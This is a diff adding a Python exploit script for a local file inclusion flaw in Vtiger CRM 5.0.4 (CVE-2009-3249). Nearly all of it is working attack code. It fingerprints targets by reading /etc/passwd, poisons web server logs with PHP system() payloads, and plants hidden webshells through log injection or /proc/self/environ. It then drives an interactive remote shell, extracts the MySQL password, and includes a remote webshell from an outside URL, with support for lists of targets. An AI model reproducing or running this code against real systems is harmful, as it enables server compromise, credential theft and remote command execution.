@@ -1,0 +1,657 @@
+#!/usr/bin/python
+# ~INFORMATION:									#
+# Exploit Title:	Vtiger CRM 5.0.4 Pre-Auth Local File Inclusion Exploit  #
+# Google Dork:		"The honest Open Source CRM" "vtiger CRM 5.0.4"		#
+# Date: 		5/3/2011						#
+# CVE:			CVE-2009-3249						#
+# Windows link:		http://bit.ly/fiOYCL					#
+# Linux link:		http://bit.ly/hluzLf					#
+# Tested on:		Windows XP/Linux Ubuntu					#
+# PHP.ini Settings:	gpc_magic_quotes = Off					#
+# Advisory: http://www.ush.it/team/ush/hack-vtigercrm_504/vtigercrm_504.txt	#
+# Creds: Giovanni "evilaliv3" Pellerano, Antonio "s4tan" Parata and Francesco	#
+# "ascii" Ongaro are credited with the discovery of this vulnerability.		#
+# Greetz: mr_me, sud0, sinn3r & my other fellow hackers				#
+# Note: Loading URL files may require tampering of code ;-)			#
+
+# ~VULNERABLE CODE:
+'''
+if(isset($_REQUEST['action']) && isset($_REQUEST['module']))
+{
+        $action = $_REQUEST['action'];
+        $current_module_file = 'modules/'.$_REQUEST['module'].'/'.$action.'.php';
+        $current_module = $_REQUEST['module'];
+}
+elseif(isset($_REQUEST['module']))
+{
+	$current_module = $_REQUEST['module'];
+	$current_module_file = 'modules/'.$_REQUEST['module'].'/Charts.php';
+}
+else {
+    exit();
+...
+...
+...
+require_once($current_module_file);
+'''
+# ~EXPLOIT:
+import linecache,random,sys,urllib,urllib2,time,re,httplib,socket,base64,os,webbrowser,getpass
+from optparse import OptionParser
+from urlparse import urlparse,urljoin
+from urllib import urlopen
+
+__CONTACT__ ="TecR0c(tecr0c@tecninja.net)"
+__DATE__ ="3.3.2011"
+__VERSION__ = "1.0"
+
+# Options for running script
+usage = "\nExample : %s http://localhost/vtigercrm/ -p 172.167.876.34:8080" % __file__
+parser = OptionParser(usage=usage)
+parser.add_option("-p","--p", type="string",action="store", dest="proxy",
+        help="HTTP Proxy <server>:<port>")
+parser.add_option("-f","--f", type="string",action="store", dest="file",
+        help="Input list of target URLS")
+parser.add_option("-P","--P",type="int",action='store', default="80", dest="port",
+        help="Choose Port [Default: %default]")
+
+(options, args) = parser.parse_args()
+
+numlines=0
+# Parameter for command execution
+vulnWebPage = "graph.php?module="
+# Loca File inclusion path
+lfi = "../../../../../../../../../"
+# OS Linux detection
+linuxOS = "etc/passwd"
+# OS Windows Detection
+windowsOS = "windows/win.ini"
+# Windows default non-IIS setup access log file for vtiger
+winLogs = "../../../logs/access.log"
+# Windows Vtiger Instllation PHP Info file
+vtPlatformLog = "../logs/platform.log"
+# Linux Log files
+lnxLogs =['/var/log/access_log',
+        '/var/log/access.log',
+        '/var/log/apache2/access_log',
+        '/var/log/apache2/access.log',
+        '/var/log/apache2/error_log',
+        '/var/log/apache2/error.log',
+        '/var/log/apache/access_log',
+        '/var/log/apache/access.log',
+        '/var/log/apache/error_log',
+        '/var/log/apache/error.log',
+        '/var/log/user.log',
+        '/var/log/user.log.1',
+        '/apache/logs/access.log',
+        '/apache/logs/error.log',
+        '/etc/httpd/logs/acces_log',
+        '/etc/httpd/logs/acces.log',
+        '/etc/httpd/logs/access_log',
+        '/etc/httpd/logs/access.log',
+        '/etc/httpd/logs/error_log',
+        '/etc/httpd/logs/error.log',
+        '/usr/local/apache2/logs/access_log',
+        '/usr/local/apache2/logs/access.log',
+        '/usr/local/apache2/logs/error_log',
+        '/usr/local/apache2/logs/error.log',
+        '/usr/local/apache/logs/access_log',
+        '/usr/local/apache/logs/access.log',
+        '/usr/local/apache/logs/error_log',
+        '/usr/local/apache/logs/error.log'
+	'/logs/access.log',
+        '/logs/error.log',
+	'/var/log/error_log',
+        '/var/log/error.log',
+        '/var/log/httpd/access_log',
+        '/var/log/httpd/access.log',
+        '/var/log/httpd/error_log',
+        '/var/log/httpd/error.log',
+        '/var/www/logs/access_log',
+        '/var/www/logs/access.log',
+        '/var/www/logs/error_log',
+        '/var/www/logs/error.log']
+# User Agents
+agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
+        "Internet Explorer 7 (Windows Vista); Mozilla/4.0 ",
+        "Google Chrome 0.2.149.29 (Windows XP)",
+        "Opera 9.25 (Windows Vista)",
+        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
+        "Opera/8.00 (Windows NT 5.1; U; en)"]
+agent = random.choice(agents)
+
+def banner(): 
+    if os.name == "posix": 
+        os.system("clear") 
+    else: 
+        os.system("cls") 
+    header = '''
+ ____   _______________.___  _____________________________ 	
+ \   \ /   /\__    ___/|   |/  _____/\_   _____/\______   \	
+  \   Y   /   |    |   |   /   \  ___ |    __)_  |       _/	
+   \     /    |    |   |   \    \_\  \|        \ |    |   \	
+    \___/     |____|   |___|\______  /_______  / |____|_  /	
+                      __,,,,_                                              
+       _ __..-;''`--/'/ /.',-`-. 
+   (`/' ` |  \ \ \ / / / / .-'/`,_   Version 5.0.4                              
+  /'`\ \   |  \ | \| // // / -.,/_,'-,                                     
+ /<7' ;  \ \  | ; ||/ /| | \/    |`-/,/-.,_,/')                            
+/  _.-, `,-\,__|  _-| / \ \/|_/  |    '-/.;.''                             
+`-`  f/ ;      / __/ \__ `/ |__/ |                                         
+     `-'      |  -| =|\_  \  |-' | %s            
+           __/   /_..-' `  ),'  // Date %s
+          ((__.-'((___..-'' \__.'
+
+'''%(__CONTACT__,__DATE__)
+    for i in header: 
+        print "\b%s"%i, 
+        sys.stdout.flush() 
+        time.sleep(0.003) 
+
+# Written to clean up shell output
+def cleanUp(response):
+	""" Comment or Uncomment if you want to filter the unwanted text returned in logs """
+	response = re.sub('<b(.*)',"", response)
+	response = re.sub("Fatal error(.*)","", response)
+	response = re.sub("Warning(.*)","", response)
+	response = re.sub('Notice(.*)',"", response)
+	return response
+
+def firstMenu():
+	print '''
+[+] 1. Test Environment
+[+] 2. Straight To Menu'''
+        if options.file:
+		print "[+] 3. Go To Next URL"
+	menuChoice = raw_input("\n>> Enter Your Choice: ")
+        if menuChoice == "1":
+		systemOS = informationGathering()
+        if menuChoice == "2":
+                systemOS = raw_input("[+] Which OS? (w)indows Or (l)inux: ")
+        if menuChoice == "3":
+		websiteList(options.file)
+		firstMenu()
+	if systemOS == "l":
+                linuxMenu()
+        if systemOS == "w":
+                windowsMenu()
+	if systemOS == None:
+		firstMenu()
+
+def websiteList(websiteFile):
+	global numlines
+	numlines+=1
+	url = linecache.getline(websiteFile, numlines)
+	url = url[:-1]
+	if url == '':
+		print "[-] No More Entries\n"
+		sys.exit()
+	print "\n["+str(numlines)+"] Target: "+url
+	url=urlparse(url)
+	return (url, numlines)
+
+def getProxy():
+	""" Lets you setup a proxy using the proxy defined in options.proxy """
+        try:
+		proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
+		socket.setdefaulttimeout(100)
+	except(socket.timeout):
+                print "\n[-] Proxy Timed Out"
+                sys.exit(1)
+        return proxy_handler
+
+def lfiRequest(localFile):
+        """ Lets you send a GET request to see if LFI is posible either by proxy or direct """
+	if options.proxy:
+		try:
+			fetch_timeout = 20
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)]
+			response = proxyfier.open(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+localFile+"%00",None,fetch_timeout).read()
+		except urllib2.HTTPError, error:
+			if error.code == '500':
+				pass
+			if options.file:
+				print "[+] Try Next URL"
+                                websiteList(options.file)
+				firstMenu()
+				sys.exit()
+			else:
+				print "[-] Check Your Webaddress And Directory"
+				sys.exit()
+                except(urllib2.URLError):
+                        print "[-] Could Not Communicate With TARGET\n"
+                        print '[-] Stopping Script\n'
+                        sys.exit()
+	else:
+		try:
+			response = urllib2.Request(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+localFile+"%00")
+			response.add_header('User-agent',agent)
+			response = urllib2.urlopen(response).read()
+			response = cleanUp(response)
+		except urllib2.HTTPError, error:
+			if error.code == '500':
+				pass
+			if options.file:
+			        print "[+] Try Next URL"
+                                websiteList(options.file)
+			        firstMenu()
+			        sys.exit()
+	                else:
+ 				print "[-] Did Not Work"
+		except(urllib2.URLError):
+			print "[-] Could Not Communicate With TARGET"
+                        print '[-] Stopping Script\n'
+                        sys.exit()
+
+	return response
+
+def getRequest(localFile):
+	""" Lets you send a GET request to see if LFI is posible either by proxy or direct """
+	if options.proxy:
+		try:
+			fetch_timeout = 300
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)]
+			response = proxyfier.open(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+lfi+localFile+"%00",None,fetch_timeout).read()                
+		except urllib2.HTTPError, error:
+                        errorMessage = str(error.code)
+			if errorMessage == '500':
+                                print error
+				response = error.read()
+				pass
+			else:
+				print "[-] Verify Address Manually:"
+				print "[+] "+url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+lfi+localFile+"%00"
+				sys.exit()
+	else:
+                try:
+			response = urllib2.Request(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+lfi+localFile+"%00")
+			response.add_header('User-agent',agent)
+			response = urllib2.urlopen(response).read()
+		except urllib2.HTTPError, error:
+                        errorMessage = str(error.code)
+                     	if errorMessage == '500':
+                                print error
+                                pass
+                        else:
+                                print "[-] Verify Address Manually:"
+                                print "[+] "+url.geturl()+vulnWebPage+lfi+localFile+"%00"
+                                sys.exit()
+	return response
+
+def socketInject(payloadType):
+	""" Lets you inject into the Apache access log by proxy or direct """
+        if options.proxy:
+		try:
+                        proxyIp, proxyPort = options.proxy.split(':')
+                        proxyPort = int(proxyPort)
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((proxyIp, proxyPort))
+                        if payloadType == 'systemPayload':
+				sock.send("GET "+url.scheme+"://"+url.netloc+":"+str(options.port)+"/"+"<?php;system(base64_decode($_COOKIE[value]));?> HTTP/1.1\r\n")
+				sock.send("User-Agent: "+agent+"\r\n")
+				sock.send("Host: "+url.geturl()+"\r\n")
+				sock.send("Connection: close\r\n\r\n")
+			if payloadType == 'includePayload':
+				sock.send("GET "+url.scheme+"://"+url.netloc+":"+str(options.port)+"/"+"<?php;include(base64_decode($_GET[cmd]));?> HTTP/1.0\r\n\r\n")
+                                sock.send("User-Agent: "+agent+"\r\n")
+                                sock.send("Host: "+url.geturl()+"\r\n")
+                                sock.send("Connection: close\r\n\r\n")			
+			sock.close()
+			print "[+] Injected Payload Into Logs"
+		except:
+        	        print "[-] Could Not Inject Into Logs"
+			sys.exit(1)
+	else:
+		try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.connect((url.netloc, options.port))
+			if payloadType == 'systemPayload':
+				sock.send("GET "+url.scheme+"://"+url.netloc+":"+str(options.port)+"/"+"<?php;system(base64_decode($_COOKIE[value]));?> HTTP/1.1\r\n")
+				sock.send("User-Agent: "+agent+"\r\n")
+				sock.send("Host: "+url.scheme+url.netloc+"\r\n")
+				sock.send("Connection: close\r\n\r\n")
+			if payloadType == 'includePayload':
+				sock.send("GET "+url.scheme+"://"+url.netloc+":"+str(options.port)+"/"+"<?php;include(base64_decode($_GET[cmd]));?> HTTP/1.0\r\n")
+				sock.send("User-Agent: "+agent+"\r\n")
+				sock.send("Host: "+url.scheme+url.netloc+"\r\n")
+				sock.send("Connection: close\r\n\r\n")
+			sock.close()
+			print "[+] Injected Payload Into Logs"
+		except:
+			print "[-] Could Not Inject Into Logs"
+			sys.exit(1)
+
+def postRequestWebShell(shellName,encodedCmd):
+	""" WebShell which sends all POST requests to hide commmands being logged in access.log """
+	webSiteUrl = url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+"cache/."+shellName+".php"
+	if options.proxy:
+		try:
+			commandToExecute = [
+			('cat',encodedCmd)]
+			cmdData = urllib.urlencode(commandToExecute)
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)]
+			cmdContent = proxyfier.open(webSiteUrl, cmdData).read()
+			cmdContent = cleanUp(cmdContent)
+			print cmdContent
+		except:
+			print "[-] Request To .%s.php Failed" % shellName
+	else:
+                try:
+			values = { 'User-Agent' : agent,
+                        'cat': encodedCmd}
+			data = urllib.urlencode(values)
+			request= urllib2.Request(webSiteUrl, data)
+			response = urllib2.urlopen(request)
+			response = response.read()
+			response = cleanUp(response)
+			print response
+		except urllib2.HTTPError, error:
+                        response = error.read()
+
+def readFromAccessLogs(cmd, logs):
+	""" Lets you choose what type of os for the log location and command to run """
+        if options.proxy:
+                try:
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)] 
+			proxyfier.addheaders.append(("Cookie", "value="+cmd))
+			response = proxyfier.open(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+logs+"%00").read()
+                except urllib2.HTTPError, error:
+			response = error.read()
+			sys.exit()
+        else:
+                try:
+			junk = None
+			headers = { 'User-Agent' : agent,
+			'Cookie': 'value='+cmd}
+			response = urllib2.Request(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+logs+"%00",junk,headers)
+			response = urllib2.urlopen(response).read()
+		except urllib2.HTTPError, error:
+                        response = error.read()
+        return response
+
+def informationGathering():
+	""" Used to gather information if magic_quotes is on, what operating sytem is being used and if error messages are on """ 
+
+        # Use default LICIENSE.txt file in webroot to gather information
+	requestContent = lfiRequest("../LICENSE.txt")
+	
+	# Test for Magic Quotes
+	print "[+] INFORMATION GATHERING:"
+	print "[+] Checking if LFI Is Posible"
+	magicQuotes = re.compile('SugarCRM Public')
+	magicQuotes = magicQuotes.search(requestContent)
+	if magicQuotes:
+		print "[+] magic_quotes_gpc = Off"
+	else:
+		print "[-] magic_quotes_gpc = On"
+		print "[-] Or Your URL Is Incorrect"
+		if options.file:
+                        websiteList(options.file)
+		        firstMenu()
+		else:
+			sys.exit()
+	# OS Detection
+	try:
+		passwd = getRequest(linuxOS)
+		searchFor = re.compile('root:')
+		searchLinuxOS = searchFor.search(passwd)
+		print "[!] Working Out The Operating System"
+		if searchLinuxOS:
+			print "[!] OS Detection: Linux"
+			systemOS = "l"
+		elif not searchLinuxOS:
+			winini = getRequest(windowsOS)
+			searchFor = re.compile('16-bit')
+			searchWindowsOS = searchFor.search(winini)
+			if searchWindowsOS:
+				print "[!] OS Detection: Windows"
+				systemOS= "w"
+			else:
+				print "[!] No Data Returned, You Will Have To Guess The Operating System"
+	       			firstMenu()
+				systemOS = None
+	except:
+		print "[-] Could Not Run OS Detection"
+		print "[-] System OS Could Not Be Set Try Option 2"
+		systemOS = None
+	try:
+		# Checking for Error Messages
+		print "[+] Checking If Error Messages Are Enabled"
+		pathError = re.compile(r"(reference in (.*)on|not found in (.*)graph.php)")
+		findPath = pathError.search(requestContent)
+		if findPath:
+                	print "[-]  Web Root Directory Is: "+findPath.group(1)
+		elif findPath == None:
+			platformRequest = getRequest(vtPlatformLog)
+			pathWinRootFinder = re.compile('REQUSET\["root_directory"\]</td><td class="v">(.*)</td>')
+			findWinPathRoot = pathWinRootFinder.search(platformRequest)
+			if findWinPathRoot:
+				 print "[-]  WWWRoot Directory From Platform.log Is: "+findWinPathRoot.group(1)
+		else:
+			print "[-]  Did Not Find Any Path Disclosure"
+	except:
+                print "[-] Could Not Run Error Message Detection"
+	return systemOS 
+
+def environInject(shellName):
+        """ Lets you get a shell through proc self environ by proxy or without """
+	webSiteUrl = url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+lfi+"proc/self/environ"+"%00"
+	shellString = "echo '<?php;system(base64_decode($_REQUEST[cat]));?>' > cache/.%s.php" % shellName
+	if options.proxy:
+		try:
+			print '[+] Testing If /proc/self/environ Exists'
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)]
+			response = proxyfier.open(webSiteUrl).read()
+			patFinder = re.compile('HTTP_USER_AGENT')
+			environContent = patFinder.search(response)
+			if environContent:
+				print '[+] Web Application Vulnerable to proc/self/environ'
+				proxyfier = urllib2.build_opener(getProxy())
+                                encodedCommand = base64.b64encode(shellString)
+                                commandToExecute = [
+                                ('cat',encodedCommand)]
+				cmdData = urllib.urlencode(commandToExecute)
+				proxyfier.addheaders = [('User-agent', "<?php system(base64_decode($_POST[cat]));?>")]
+				cmdContent = proxyfier.open(webSiteUrl, cmdData).read()
+			else:
+				print '[-] Could Not Create Shell'
+				sys.exit()
+                except: 
+                        print "[-] Seems To Not Be Vulnerable To Proc Self Environment"
+        		linuxMenu()
+			sys.exit()
+	else:
+                try:
+                        shellString = "echo '<?php;system(base64_decode($_REQUEST[cat]));?>' > cache/.%s.php" % shellName
+                        encodedCommand = base64.b64encode(shellString)
+                        headers = {'User-Agent' : '<?php system(base64_decode($_POST[cat]));?>',
+                        'cat' : encodedCommand}
+                        cmdContent = urllib2.Request(webSiteUrl,junk,headers)
+			cmdContent = urllib2.urlopen(cmdContent).read()
+		except urllib2.HTTPError, error:
+                        response = error.read()
+			print response
+	
+	while True:
+		try:
+			command = raw_input(commandLine)
+			encodedCmd = base64.b64encode(command)
+			postRequestWebShell(shellName,encodedCmd)
+		except KeyboardInterrupt:
+			encodedCmd = base64.b64encode('rm .'+shellName+'.php')
+			postRequestWebShell(shellName,encodedCmd)
+			print "[-] CTRL+C Detected!"
+			print "[+] Removed .%s.php\n" % shellName
+			sys.exit()
+
+def logInject(payloadType):
+	""" Lets you choose what type of payload to use such as include or system """
+	inject = raw_input("[?] To Inject? Press ENTER, Otherwise Type 'n' : ")
+	if inject == 'yes' or inject == 'y' or inject == '':
+		socketInject(payloadType)
+        else:
+		print "[!] Did Not Inject Into Logs"
+
+def proxyCheck():
+	if options.proxy:
+		try:
+			h2 = httplib.HTTPConnection(options.proxy)
+			h2.connect()
+			print "[+] Using Proxy Server:",options.proxy
+		except(socket.timeout):
+			print "[-] Proxy Timed Out\n"
+			pass
+			sys.exit(1)
+		except(NameError):
+			print "[-] Proxy Not Given\n"
+			pass
+			sys.exit(1)
+		except:
+			print "[-] Proxy Failed\n"
+			pass
+			sys.exit(1)
+
+def shellMessage(shellName):
+	print '''
+ # Shell: .%s.php 
+ ###########################
+ # Welcome To Remote Shell #
+  # This Is Not Interactive #
+ # To Exist Shell Ctrl + C #
+     # Hack The Gibson #
+ ###########################
+	''' % shellName
+
+# Linux Techniques
+def linuxMenu():
+        print '''
+[+] 1. Terminal By Logs
+[+] 2. Terminal By Proc Self Environment'''
+        if options.file:
+                print '[+] 3. Go To Next URL'
+        lnxChoice = raw_input(">> Enter Your Choice: ")
+
+        # Log Technique
+        if lnxChoice == '1':
+                print "[!] Lets Hope You Got Rights To Their Logs!"
+                for log in lnxLogs:
+                        print "[-] Testing %s" % log
+                        logReponse = getRequest(log)
+                        command2Find = re.compile('" 200')
+                        findCommand = command2Find.search(logReponse)
+                        if findCommand:
+                                print "[+] Injectable Log File Located @ %s" % log
+                                logInject("systemPayload")
+                                yourChoice = raw_input('[?] Do You Want To Create A Webshell? Press ENTER, Otherwise Type \'n\': ')
+                                logWithLfi = lfi+log
+                                if yourChoice == '':
+                                        shellName = raw_input('[?] Name Of Your Webshell: ')
+                                        print '[+] Creating Webshell'
+                                        systemCommand = "echo '<?php;system(base64_decode($_REQUEST[cat]));?>' > cache/.%s.php" % shellName
+                                        encodedCmd = base64.b64encode(systemCommand)
+                                        readFromAccessLogs(encodedCmd, logWithLfi)
+                                        print "[!] Tempting To Create WebShell .%s.php" % shellName
+                                        shellMessage(shellName)
+                                        while True:
+                                                try:
+                                                        command = raw_input(commandLine)
+                                                        encodedCmd = base64.b64encode(command)
+                                                        postRequestWebShell(shellName,encodedCmd)
+                                                except KeyboardInterrupt:
+                                                        encodedCmd = base64.b64encode('rm .'+shellName+'.php')
+                                                        postRequestWebShell(shellName,encodedCmd)
+                                                        print "[-] CTRL+C Detected!"
+                                                        print "[+] Removed .%s.php\n" % shellName
+                                                        sys.exit()
+                                else:
+                                        cleanUp(response)
+                                        logInject("systemPayload")
+                                        while True:
+                                                try:
+                                                        command = raw_input(commandLine)
+                                                        encodedCmd = base64.b64encode(command)
+                                                        postRequestWebShell(shellName,encodedCmd)
+                                                except KeyboardInterrupt:
+                                                        encodedCmd = base64.b64encode('rm .'+shellName+'.php')
+                                                        postRequestWebShell(shellName,encodedCmd)
+                                                        print "[-] CTRL+C detected!"
+                                                        print "[+] Removed .%s.php\n" % shellName
+                                                        sys.exit()
+        # Environ Technique
+        if lnxChoice == '2':
+		shellName = raw_input('[?] Name Of Your Webshell: ') 
+		environInject(shellName)
+
+        if lnxChoice == '3':
+                websiteList(options.file)
+                firstMenu()
+                sys.exit()
+
+def windowsMenu():
+		print '''
+[+] 1. Remote File Inclusion Browser Shell           
+[+] 2. VTiger MySQL Password
+[+] 3. PHP WebShell
+		'''
+        	winChoice = raw_input(">> Enter your choice: ")
+        	if winChoice == '1':
+            		try:
+                		logInject("includePayload")
+                		print "[+] Example: http://www.xfocus.net.ru/soft/r57.txt"
+                		rfi = raw_input('>>> Enter Your Remote Webshell URL: ')
+                		webbrowser.open(url.scheme+"://"+url.netloc+":"+str(options.port)+url.path+vulnWebPage+winLogs+"%00"+"&cmd="+base64.b64encode(rfi))
+                                print "[+] Check Your Web Browser!"
+                        except:
+                		print "[-] RFI @ %s Did Not Work" % rfi
+		if winChoice == "2":
+			f = lfiRequest(vtPlatformLog)
+			patFinder = re.compile('POST\["db_password"\]</td><td class="v">(.*)</td>') 
+			findUser = patFinder.search(f)
+			if findUser is None:
+				print '[-] Did Not Find MySQL Database Password'
+			else:
+				print "[!] VTiger Password: "+findUser.group(1)
+		if winChoice == "3":
+			logInject("systemPayload")
+			shellName = raw_input('[?] Name Of Your Webshell: ')
+			systemCommand = "echo ^<?php;system(base64_decode($_REQUEST[cat]));?^> > cache/.%s.php" % shellName
+			encodedCmd = base64.b64encode(systemCommand)
+			readFromAccessLogs(encodedCmd, winLogs)      		
+			print "[!] Created WebShell .%s.php" % shellName
+			shellMessage(shellName)
+			while True:
+				try: 
+					command = raw_input(commandLine) 
+					encodedCmd = base64.b64encode(command)
+					postRequestWebShell(shellName,encodedCmd)
+				except KeyboardInterrupt:
+					encodedCmd = base64.b64encode('del .'+shellName+'.php')
+					postRequestWebShell(shellName,encodedCmd)
+					print "[-] CTRL+C Detected!"
+					print "[+] Removed .%s.php\n" % shellName
+					sys.exit()
+if "__main__" == __name__:
+	banner()
+        proxyCheck()
+	try:
+	        url=urlparse(args[0])
+	except:
+		if options.file:
+			print "[+] Using Website List"
+			url,numlines = websiteList(options.file)
+		else:
+			parser.print_help()
+                	print "\n[-] Check Your URL\n"	
+			sys.exit(1)
+	if not url.scheme:
+		print usage+"\n"
+		print "[-] Missing HTTP/HTTPS\n"
+		sys.exit(1)
+	commandLine = ('[RSHELL] %s@%s# ') % (getpass.getuser(),url.netloc)
+	if not options.file:
+		print "[+] Target: "+url.scheme+"://"+url.netloc+":"+str(options.port)+url.path
+	firstMenu()
